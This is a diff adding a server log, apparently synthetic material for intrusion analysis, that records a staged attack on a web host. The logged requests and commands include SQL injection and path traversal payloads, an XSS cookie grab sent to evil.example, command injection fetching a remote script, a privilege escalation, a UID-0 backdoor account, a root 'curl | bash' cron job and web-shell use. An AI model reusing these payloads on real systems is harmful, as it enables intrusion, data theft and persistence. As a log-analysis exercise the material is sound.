@@ -1,0 +1,78 @@
+Oct 14 08:02:11 web-prod-01 systemd[1]: Started nginx.service - A high performance web server.
+Oct 14 08:02:32 web-prod-01 sshd[1021]: Accepted publickey for deploy from 10.0.4.12 port 50122 ssh2: ED25519 SHA256:q1X3n8Lr0bZk
+Oct 14 08:02:42 web-prod-01 sshd[1021]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+203.0.113.24 - - [14/Oct/2026:08:03:08 +0000] "GET / HTTP/1.1" 200 5123 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
+203.0.113.24 - - [14/Oct/2026:08:03:12 +0000] "GET /static/app.css HTTP/1.1" 200 18233 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
+203.0.113.24 - - [14/Oct/2026:08:03:17 +0000] "GET /items?name=widget HTTP/1.1" 200 932 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
+203.0.113.24 - - [14/Oct/2026:08:03:52 +0000] "GET /login HTTP/1.1" 200 2210 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
+198.51.100.7 - - [14/Oct/2026:08:03:59 +0000] "GET /items?name=bolt HTTP/1.1" 200 611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+Oct 14 08:04:01 web-prod-01 sshd[2200]: Failed password for root from 192.0.2.47 port 40000 ssh2
+Oct 14 08:04:04 web-prod-01 sshd[2201]: Failed password for admin from 192.0.2.47 port 40007 ssh2
+Oct 14 08:04:05 web-prod-01 sshd[2202]: Failed password for root from 192.0.2.47 port 40014 ssh2
+Oct 14 08:04:08 web-prod-01 sshd[2203]: Invalid user ubuntu from 192.0.2.47 port 40021
+Oct 14 08:04:08 web-prod-01 sshd[2203]: Failed password for invalid user ubuntu from 192.0.2.47 port 40021 ssh2
+Oct 14 08:04:09 web-prod-01 sshd[2204]: Failed password for root from 192.0.2.47 port 40028 ssh2
+Oct 14 08:04:10 web-prod-01 sshd[2205]: Invalid user test from 192.0.2.47 port 40035
+Oct 14 08:04:10 web-prod-01 sshd[2205]: Failed password for invalid user test from 192.0.2.47 port 40035 ssh2
+Oct 14 08:04:11 web-prod-01 sshd[2206]: Invalid user oracle from 192.0.2.47 port 40042
+Oct 14 08:04:11 web-prod-01 sshd[2206]: Failed password for invalid user oracle from 192.0.2.47 port 40042 ssh2
+Oct 14 08:04:13 web-prod-01 sshd[2207]: Failed password for root from 192.0.2.47 port 40049 ssh2
+Oct 14 08:04:15 web-prod-01 sshd[2208]: Invalid user postgres from 192.0.2.47 port 40056
+Oct 14 08:04:15 web-prod-01 sshd[2208]: Failed password for invalid user postgres from 192.0.2.47 port 40056 ssh2
+Oct 14 08:04:16 web-prod-01 sshd[2209]: Failed password for admin from 192.0.2.47 port 40063 ssh2
+Oct 14 08:04:17 web-prod-01 sshd[2210]: Failed password for root from 192.0.2.47 port 40070 ssh2
+Oct 14 08:04:18 web-prod-01 sshd[2211]: Invalid user git from 192.0.2.47 port 40077
+Oct 14 08:04:18 web-prod-01 sshd[2211]: Failed password for invalid user git from 192.0.2.47 port 40077 ssh2
+Oct 14 08:04:20 web-prod-01 sshd[2215]: error: maximum authentication attempts exceeded for root from 192.0.2.47 port 40091 ssh2 [preauth]
+Oct 14 08:04:56 web-prod-01 sshd[2215]: Disconnecting authenticating user root 192.0.2.47 port 40091: Too many authentication failures [preauth]
+198.51.100.7 - - [14/Oct/2026:08:05:24 +0000] "GET /download?file=invoice_1042.pdf HTTP/1.1" 200 48211 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+198.51.100.110 - - [14/Oct/2026:08:05:25 +0000] "GET /items?name=widget%27 HTTP/1.1" 500 312 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
+198.51.100.110 - - [14/Oct/2026:08:05:26 +0000] "GET /items?name=widget%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 88213 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
+198.51.100.110 - - [14/Oct/2026:08:05:28 +0000] "GET /items?name=widget%27%20UNION%20SELECT%20username%2Cpassword_hash%2CNULL%20FROM%20users-- HTTP/1.1" 200 4410 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
+198.51.100.110 - - [14/Oct/2026:08:05:29 +0000] "GET /items?name=widget%27%20AND%20SLEEP(5)--%20- HTTP/1.1" 200 931 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
+198.51.100.110 - - [14/Oct/2026:08:05:33 +0000] "GET /items?name=widget%27%3B%20DROP%20TABLE%20items-- HTTP/1.1" 500 312 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
+198.51.100.110 - - [14/Oct/2026:08:05:37 +0000] "POST /login?username=admin%27--&password=x HTTP/1.1" 200 98 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
+Oct 14 08:05:52 web-prod-01 app[3311]: ERROR sqlite3.OperationalError: near "' OR '1'='1": syntax error in query SELECT * FROM items WHERE name LIKE '%widget' OR '1'='1%'
+198.51.100.84 - - [14/Oct/2026:08:05:52 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1873 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007431)"
+198.51.100.84 - - [14/Oct/2026:08:05:54 +0000] "GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 162 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007431)"
+198.51.100.84 - - [14/Oct/2026:08:05:54 +0000] "GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fhome%2fdeploy%2f.ssh%2fid_rsa HTTP/1.1" 200 2602 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007431)"
+198.51.100.84 - - [14/Oct/2026:08:05:55 +0000] "GET /download?file=....//....//....//proc/self/environ HTTP/1.1" 200 911 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007431)"
+198.51.100.84 - - [14/Oct/2026:08:05:56 +0000] "GET /files?name=../../../../windows/win.ini HTTP/1.1" 404 152 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007431)"
+198.51.100.84 - - [14/Oct/2026:08:05:56 +0000] "GET /.env HTTP/1.1" 404 152 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007431)"
+198.51.100.84 - - [14/Oct/2026:08:05:58 +0000] "GET /.git/config HTTP/1.1" 404 152 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007431)"
+198.51.100.84 - - [14/Oct/2026:08:05:58 +0000] "GET /wp-admin/install.php HTTP/1.1" 404 152 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007431)"
+198.51.100.84 - - [14/Oct/2026:08:06:00 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 152 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007431)"
+203.0.113.5 - - [14/Oct/2026:08:06:20 +0000] "GET /search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.example%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1" 200 377 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
+203.0.113.5 - - [14/Oct/2026:08:06:56 +0000] "GET /ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd HTTP/1.1" 200 2210 "-" "curl/8.5.0"
+203.0.113.5 - - [14/Oct/2026:08:07:08 +0000] "GET /api/lookup?domain=example.com%7Cwget%20http%3A%2F%2F203.0.113.5%2Fx.sh%20-O%20%2Ftmp%2Fx.sh HTTP/1.1" 200 401 "-" "curl/8.5.0"
+203.0.113.5 - - [14/Oct/2026:08:07:15 +0000] "GET /calc?expr=__import__(%27os%27).popen(%27id%27).read() HTTP/1.1" 200 61 "-" "curl/8.5.0"
+192.0.2.38 - - [14/Oct/2026:08:07:15 +0000] "POST /login HTTP/1.1" 401 34 "-" "python-requests/2.32.3"
+192.0.2.38 - - [14/Oct/2026:08:07:16 +0000] "POST /login HTTP/1.1" 401 34 "-" "python-requests/2.32.3"
+192.0.2.38 - - [14/Oct/2026:08:07:16 +0000] "POST /login HTTP/1.1" 401 34 "-" "python-requests/2.32.3"
+192.0.2.38 - - [14/Oct/2026:08:07:16 +0000] "POST /login HTTP/1.1" 401 34 "-" "python-requests/2.32.3"
+192.0.2.38 - - [14/Oct/2026:08:07:16 +0000] "POST /login HTTP/1.1" 401 34 "-" "python-requests/2.32.3"
+192.0.2.38 - - [14/Oct/2026:08:07:16 +0000] "POST /login HTTP/1.1" 401 34 "-" "python-requests/2.32.3"
+192.0.2.38 - - [14/Oct/2026:08:07:17 +0000] "POST /login HTTP/1.1" 401 34 "-" "python-requests/2.32.3"
+192.0.2.38 - - [14/Oct/2026:08:07:18 +0000] "POST /login HTTP/1.1" 401 34 "-" "python-requests/2.32.3"
+192.0.2.38 - - [14/Oct/2026:08:07:19 +0000] "POST /login HTTP/1.1" 401 34 "-" "python-requests/2.32.3"
+192.0.2.38 - - [14/Oct/2026:08:07:20 +0000] "POST /login HTTP/1.1" 200 41 "-" "python-requests/2.32.3"
+Oct 14 08:07:25 web-prod-01 sshd[2400]: Failed password for backup from 203.0.113.102 port 51000 ssh2
+Oct 14 08:07:30 web-prod-01 sshd[2401]: Failed password for backup from 203.0.113.102 port 51001 ssh2
+Oct 14 08:07:34 web-prod-01 sshd[2402]: Failed password for backup from 203.0.113.102 port 51002 ssh2
+Oct 14 08:07:38 web-prod-01 sshd[2403]: Failed password for backup from 203.0.113.102 port 51003 ssh2
+Oct 14 08:07:41 web-prod-01 sshd[2404]: Failed password for backup from 203.0.113.102 port 51004 ssh2
+Oct 14 08:07:45 web-prod-01 sshd[2406]: Accepted password for backup from 203.0.113.102 port 51011 ssh2
+Oct 14 08:07:57 web-prod-01 sshd[2406]: pam_unix(sshd:session): session opened for user backup(uid=1003) by (uid=0)
+Oct 14 08:08:13 web-prod-01 sudo:   backup : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash
+Oct 14 08:08:19 web-prod-01 sudo:   backup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh -p ; -quit
+Oct 14 08:08:56 web-prod-01 useradd[2470]: new user: name=sysupdate, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/1
+Oct 14 08:09:16 web-prod-01 crontab[2481]: (root) REPLACE (root)
+Oct 14 08:09:50 web-prod-01 CRON[2490]: (root) CMD (curl -s http://203.0.113.102/u.sh | bash)
+Oct 14 08:10:22 web-prod-01 nginx[880]: 2026/10/14 08:31:02 [warn] 880#880: *4411 an upstream response is buffered to a temporary file, client: 203.0.113.24
+Oct 14 08:10:44 web-prod-01 app[3311]: WARNING * Debugger is active! * Debugger PIN: 118-602-945  (running with debug=True on 0.0.0.0:5000)
+203.0.113.102 - - [14/Oct/2026:08:11:13 +0000] "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 9 "-" "Mozilla/5.0"
+203.0.113.102 - - [14/Oct/2026:08:11:32 +0000] "GET /uploads/shell.php?cmd=cat%20%2Fvar%2Fapp%2F.env HTTP/1.1" 200 422 "-" "Mozilla/5.0"
+198.51.100.7 - - [14/Oct/2026:08:12:11 +0000] "GET / HTTP/1.1" 200 5123 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+198.51.100.7 - - [14/Oct/2026:08:12:16 +0000] "GET /items?name=nut HTTP/1.1" 200 702 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+198.51.100.7 - - [14/Oct/2026:08:12:24 +0000] "GET /static/logo.png HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+Oct 14 08:12:57 web-prod-01 sshd[1021]: pam_unix(sshd:session): session closed for user deploy
